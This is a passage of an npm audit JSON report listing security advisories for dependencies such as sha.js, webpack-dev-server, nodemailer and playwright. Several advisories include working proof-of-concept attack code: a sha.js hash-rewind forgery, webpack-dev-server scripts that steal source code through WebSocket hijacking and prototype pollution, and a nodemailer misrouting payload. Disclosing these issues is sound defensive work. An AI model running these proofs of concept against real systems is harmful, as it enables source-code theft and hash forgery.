      "overview": "### Summary\n\nThis is the same as [GHSA-cpq7-6gpm-g9rc](https://github.com/browserify/cipher-base/security/advisories/GHSA-cpq7-6gpm-g9rc) but just for `sha.js`, as it has its own implementation.\n\nMissing input type checks can allow types other than a well-formed `Buffer` or `string`, resulting in invalid values, hanging and rewinding the hash state (including turning a tagged hash into an untagged hash), or other generally undefined behaviour.\n\n### Details\n\nSee PoC\n\n### PoC\n```js\nconst forgeHash = (data, payload) => JSON.stringify([payload, { length: -payload.length}, [...data]])\n\nconst sha = require('sha.js')\nconst { randomBytes } = require('crypto')\n\nconst sha256 = (...messages) => {\n  const hash = sha('sha256')\n  messages.forEach((m) => hash.update(m))\n  return hash.digest('hex')\n}\n\nconst validMessage = [randomBytes(32), randomBytes(32), randomBytes(32)] // whatever\n\nconst payload = forgeHash(Buffer.concat(validMessage), 'Hashed input means safe')\nconst receivedMessage = JSON.parse(payload) // e.g. over network, whatever\n\nconsole.log(sha256(...validMessage))\nconsole.log(sha256(...receivedMessage))\nconsole.log(receivedMessage[0])\n```\n\nOutput:\n```\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\n638d5bf3ca5d1decf7b78029f1c4a58558143d62d0848d71e27b2a6ff312d7c4\nHashed input means safe\n```\n\nOr just:\n```console\n> require('sha.js')('sha256').update('foo').digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n> require('sha.js')('sha256').update('fooabc').update({length:-3}).digest('hex')\n'2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae'\n```\n\n### Impact\n\n1. Hash state rewind on `{length: -x}`. This is behind the PoC above, also this way an attacker can turn a tagged hash in cryptographic libraries into an untagged hash.\n2. Value miscalculation, e.g. a collision is generated by `{ length: buf.length, ...buf, 0: buf[0] + 256 }`\n    This will result in the same hash as of `buf`, but can be treated by other code differently (e.g. bn.js)\n4. DoS on `{length:'1e99'}`\n5. On a subsequent system, (2) can turn into matching hashes but different numeric representations, leading to issues up to private key extraction from cryptography libraries (as nonce is often generated through a hash, and matching nonces for different values often immediately leads to private key restoration)",
      "reported_by": null,
      "title": "sha.js is missing type checks leading to hash rewind and passing on crafted data",
      "metadata": null,
      "cves": [
        "CVE-2025-9288"
      ],
      "access": "public",
      "severity": "critical",
      "module_name": "sha.js",
      "vulnerable_versions": "<=2.4.11",
      "github_advisory_id": "GHSA-95m3-7q98-8xr5",
      "recommendation": "Upgrade to version 2.4.12 or later",
      "patched_versions": ">=2.4.12",
      "updated": "2025-09-13T04:47:07.000Z",
      "cvss": {
        "score": 9.1,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
      },
      "cwe": [
        "CWE-20"
      ],
      "url": "https://github.com/advisories/GHSA-95m3-7q98-8xr5"
    },
    "1108189": {
      "findings": [
        {
          "version": "0.6.0",
          "paths": [
            "packages__components>@stripe/agent-toolkit>ai>jsondiffpatch"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-9910\n- https://github.com/benjamine/jsondiffpatch/issues/383\n- https://github.com/benjamine/jsondiffpatch/commit/0e374b5dd8d7879b329a9fc18affbd46ad50dd14\n- https://benjamine.github.io/jsondiffpatch/index.html\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-12549277\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-12549276\n- https://security.snyk.io/vuln/SNYK-JS-JSONDIFFPATCH-10369031\n- https://github.com/advisories/GHSA-33vc-wfww-vjfv",
      "created": "2025-09-11T06:30:23.000Z",
      "id": 1108189,
      "npm_advisory_id": null,
      "overview": "### Vulnerability in jsondiffpatch\n\nVersions of `jsondiffpatch` prior to `0.7.2` are vulnerable to Cross-site Scripting (XSS) in the `HtmlFormatter` (`HtmlFormatter::nodeBegin`). When diffs are rendered to HTML using the built-in formatter, untrusted payloads can inject scripts and execute in the context of a consuming web page.\n\n**Affected versions:** >= 0, < 0.7.2\n**Patched version:** 0.7.2\n\n**Remediation**\nUpgrade to `jsondiffpatch` `0.7.2` or later. The fix hardens the HTML formatter to avoid script injection.\n\n**Workarounds**\nAvoid using the HTML formatter on untrusted diffs, or sanitize/escape the rendered output.",
      "reported_by": null,
      "title": "jsondiffpatch is vulnerable to Cross-site Scripting (XSS) via HtmlFormatter::nodeBegin",
      "metadata": null,
      "cves": [
        "CVE-2025-9910"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "jsondiffpatch",
      "vulnerable_versions": "<0.7.2",
      "github_advisory_id": "GHSA-33vc-wfww-vjfv",
      "recommendation": "Upgrade to version 0.7.2 or later",
      "patched_versions": ">=0.7.2",
      "updated": "2025-09-22T22:45:33.000Z",
      "cvss": {
        "score": 4.7,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-33vc-wfww-vjfv"
    },
    "1108378": {
      "findings": [
        {
          "version": "3.1.0",
          "paths": [
            "packages__components>faiss-node>prebuild-install>tar-fs"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59343\n- https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09\n- https://github.com/advisories/GHSA-vj76-c3g6-qr5v",
      "created": "2025-09-24T18:57:04.000Z",
      "id": 1108378,
      "npm_advisory_id": null,
      "overview": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
      "reported_by": null,
      "title": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball",
      "metadata": null,
      "cves": [
        "CVE-2025-59343"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "tar-fs",
      "vulnerable_versions": ">=3.0.0 <3.1.1",
      "github_advisory_id": "GHSA-vj76-c3g6-qr5v",
      "recommendation": "Upgrade to version 3.1.1 or later",
      "patched_versions": ">=3.1.1",
      "updated": "2025-09-26T17:24:26.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-22",
        "CWE-61"
      ],
      "url": "https://github.com/advisories/GHSA-vj76-c3g6-qr5v"
    },
    "1108429": {
      "findings": [
        {
          "version": "4.15.1",
          "paths": [
            "packages__ui>react-scripts>webpack-dev-server"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30360\n- https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/advisories/GHSA-9jgg-88mc-972h",
      "created": "2025-06-04T21:09:38.000Z",
      "id": 1108429,
      "npm_advisory_id": null,
      "overview": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
      "reported_by": null,
      "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
      "metadata": null,
      "cves": [
        "CVE-2025-30360"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "webpack-dev-server",
      "vulnerable_versions": "<=5.2.0",
      "github_advisory_id": "GHSA-9jgg-88mc-972h",
      "recommendation": "Upgrade to version 5.2.1 or later",
      "patched_versions": ">=5.2.1",
      "updated": "2025-10-03T13:25:56.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-346"
      ],
      "url": "https://github.com/advisories/GHSA-9jgg-88mc-972h"
    },
    "1108430": {
      "findings": [
        {
          "version": "4.15.1",
          "paths": [
            "packages__ui>react-scripts>webpack-dev-server"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-30359\n- https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e\n- https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239\n- https://github.com/advisories/GHSA-4v9v-hfq4-rm2v",
      "created": "2025-06-04T21:09:13.000Z",
      "id": 1108430,
      "npm_advisory_id": null,
      "overview": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
      "reported_by": null,
      "title": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
      "metadata": null,
      "cves": [
        "CVE-2025-30359"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "webpack-dev-server",
      "vulnerable_versions": "<=5.2.0",
      "github_advisory_id": "GHSA-4v9v-hfq4-rm2v",
      "recommendation": "Upgrade to version 5.2.1 or later",
      "patched_versions": ">=5.2.1",
      "updated": "2025-10-03T13:25:41.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
      },
      "cwe": [
        "CWE-749"
      ],
      "url": "https://github.com/advisories/GHSA-4v9v-hfq4-rm2v"
    },
    "1108571": {
      "findings": [
        {
          "version": "6.9.15",
          "paths": [
            "packages__server>nodemailer"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
      "created": "2025-10-07T13:42:02.000Z",
      "id": 1108571,
      "npm_advisory_id": null,
      "overview": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
      "reported_by": null,
      "title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
      "metadata": null,
      "cves": [],
      "access": "public",
      "severity": "moderate",
      "module_name": "nodemailer",
      "vulnerable_versions": "<7.0.7",
      "github_advisory_id": "GHSA-mm7p-fcc7-pg87",
      "recommendation": "Upgrade to version 7.0.7 or later",
      "patched_versions": ">=7.0.7",
      "updated": "2025-10-07T13:42:04.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-20",
        "CWE-436"
      ],
      "url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
    },
    "1109073": {
      "findings": [
        {
          "version": "1.7.2",
          "paths": [
            "packages__components>llamaindex>mammoth"
          ]
        },
        {
          "version": "1.7.0",
          "paths": [
            "packages__components>mammoth"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-11849\n- https://github.com/mwilliamson/mammoth.js/commit/c54aaeb43a7941317c1f3c119ffa92090f988820\n- https://gist.github.com/AudunWA/4d690d9ae5efdafe7cf71d9c2ee90a10\n- https://security.snyk.io/vuln/SNYK-DOTNET-MAMMOTH-13561968\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGZWOBBLEMAMMOTH-13561969\n- https://security.snyk.io/vuln/SNYK-JS-MAMMOTH-13554470\n- https://security.snyk.io/vuln/SNYK-PYTHON-MAMMOTH-13561967\n- https://github.com/advisories/GHSA-rmjr-87wv-gf87",
      "created": "2025-10-17T06:31:11.000Z",
      "id": 1109073,
      "npm_advisory_id": null,
      "overview": "Versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth from 0.3.25 and before 1.11.0; versions of the package mammoth before 1.11.0; versions of the package org.zwobble.mammoth:mammoth before 1.11.0 are vulnerable to Directory Traversal due to the lack of path or file type validation when processing a docx file containing an image with an external link (r:link attribute instead of embedded r:embed). The library resolves the URI to a file path and after reading, the content is encoded as base64 and included in the HTML output as a data URI. An attacker can read arbitrary files on the system where the conversion is performed or cause an excessive resources consumption by crafting a docx file that links to special device files such as /dev/random or /dev/zero.",
      "reported_by": null,
      "title": "Mammoth is vulnerable to Directory Traversal",
      "metadata": null,
      "cves": [
        "CVE-2025-11849"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "mammoth",
      "vulnerable_versions": ">=0.3.25 <1.11.0",
      "github_advisory_id": "GHSA-rmjr-87wv-gf87",
      "recommendation": "Upgrade to version 1.11.0 or later",
      "patched_versions": ">=1.11.0",
      "updated": "2025-10-17T17:50:01.000Z",
      "cvss": {
        "score": 9.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:H"
      },
      "cwe": [
        "CWE-22"
      ],
      "url": "https://github.com/advisories/GHSA-rmjr-87wv-gf87"
    },
    "1109208": {
      "findings": [
        {
          "version": "1.49.1",
          "paths": [
            "packages__components>@langchain/community>@browserbasehq/stagehand>@playwright/test>playwright"
          ]
        },
        {
          "version": "1.42.1",
          "paths": [
            "packages__components>playwright"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-59288\n- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-59288\n- https://github.com/SocketDev/security-research/security/advisories/GHSA-qxm8-4v54-964r\n- https://github.com/microsoft/playwright/pull/37532\n- https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n- https://github.com/microsoft/playwright/releases/tag/v1.55.1\n- https://github.com/microsoft/playwright/releases/tag/v1.56.0\n- https://github.com/advisories/GHSA-7mvr-c777-76hp",
      "created": "2025-10-14T18:30:36.000Z",
      "id": 1109208,
      "npm_advisory_id": null,
      "overview": "### Summary\nUse of `curl` with the `-k` (or `--insecure`) flag in installer scripts allows attackers to deliver arbitrary executables via Man-in-the-Middle (MitM) attacks. This can lead to full system compromise, as the downloaded files are installed as privileged applications.\n\n### Details\nThe following scripts in the `microsoft/playwright` repository at commit [`bee11cbc28f24bd18e726163d0b9b1571b4f26a8`](https://github.com/microsoft/playwright/commit/bee11cbc28f24bd18e726163d0b9b1571b4f26a8) use `curl -k` to fetch and install executable packages without verifying the authenticity of the SSL certificate:\n\n\n- [`packages/playwright-core/bin/reinstall_chrome_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_chrome_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_chrome_stable_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_dev_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_dev_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_beta_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_beta_mac.sh)\n- [`packages/playwright-core/bin/reinstall_msedge_stable_mac.sh`](https://github.com/microsoft/playwright/blob/bee11cbc28f24bd18e726163d0b9b1571b4f26a8/packages/playwright-core/bin/reinstall_msedge_stable_mac.sh)\n\nIn each case, the shell scripts download a browser installer package using `curl -k` and immediately install it:\n\n```shell\ncurl --retry 3 -o ./<pkg-file> -k <url>\nsudo installer -pkg /tmp/<pkg-file> -target /\n```\n\nDisabling SSL verification (`-k`) means the download can be intercepted and replaced with malicious content.\n\n### PoC\nA high-level exploitation scenario:\n\n1. An attacker performs a MitM attack on a network where the victim runs one of these scripts.\n2. The attacker intercepts the HTTPS request and serves a malicious package (for example, a trojaned browser installer).\n3. Because `curl -k` is used, the script downloads and installs the attacker's payload without any certificate validation.\n4. The attacker's code is executed with system privileges, leading to full compromise.\n\nNo special configuration is needed: simply running these scripts on any untrusted or hostile network is enough.\n\n### Impact\nThis is a critical Remote Code Execution (RCE) vulnerability due to improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)",
      "reported_by": null,
      "title": "Playwright downloads and installs browsers without verifying the authenticity of the SSL certificate",
      "metadata": null,
      "cves": [
        "CVE-2025-59288"
      ],
      "access": "public",
      "severity": "high",
      "module_name": "playwright",
      "vulnerable_versions": "<1.55.1",
      "github_advisory_id": "GHSA-7mvr-c777-76hp",
      "recommendation": "Upgrade to version 1.55.1 or later",
      "patched_versions": ">=1.55.1",
      "updated": "2025-10-24T20:05:50.000Z",
      "cvss": {
        "score": 0,
        "vectorString": null
      },
      "cwe": [
        "CWE-347"
      ],
      "url": "https://github.com/advisories/GHSA-7mvr-c777-76hp"
    },
    "1109241": {
      "findings": [
        {
          "version": "13.12.0",
          "paths": [
            "packages__api-documentation>swagger-jsdoc>swagger-parser>@apidevtools/swagger-parser>z-schema>validator"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-56200\n- https://gist.github.com/junan-98/27ae092aa40e2a057d41a0f95148f666\n- https://gist.github.com/junan-98/a93130505b258b9e4ec9f393e7533596\n- https://github.com/validatorjs/validator.js\n- http://validatorjs.com\n- https://github.com/validatorjs/validator.js/issues/2600\n- https://github.com/validatorjs/validator.js/pull/2608\n- https://github.com/validatorjs/validator.js/commit/cbef5088f02d36caf978f378bb845fe49bdc0809\n- https://github.com/validatorjs/validator.js/releases/tag/13.15.20\n- https://github.com/advisories/GHSA-9965-vmph-33xx",
      "created": "2025-09-30T18:30:25.000Z",
      "id": 1109241,
      "npm_advisory_id": null,
      "overview": "A URL validation bypass vulnerability exists in validator.js prior to version 13.15.20. The isURL() function uses '://' as a delimiter to parse protocols, while browsers use ':' as the delimiter. This parsing difference allows attackers to bypass protocol and domain validation by crafting URLs leading to XSS and Open Redirect attacks.",
      "reported_by": null,
      "title": "validator.js has a URL validation bypass vulnerability in its isURL function",
      "metadata": null,
      "cves": [
        "CVE-2025-56200"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "validator",
      "vulnerable_versions": "<13.15.20",
      "github_advisory_id": "GHSA-9965-vmph-33xx",
      "recommendation": "Upgrade to version 13.15.20 or later",
      "patched_versions": ">=13.15.20",
      "updated": "2025-10-27T12:53:01.000Z",
      "cvss": {
        "score": 6.1,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-79"
      ],
      "url": "https://github.com/advisories/GHSA-9965-vmph-33xx"
    }
  },
  "muted": [],
  "metadata": {
    "vulnerabilities": {
      "info": 0,
      "low": 18,
      "moderate": 49,
      "high": 3,
      "critical": 1
    },
    "dependencies": 3956,
    "devDependencies": 0,
    "optionalDependencies": 0,
    "totalDependencies": 3956
  }
}
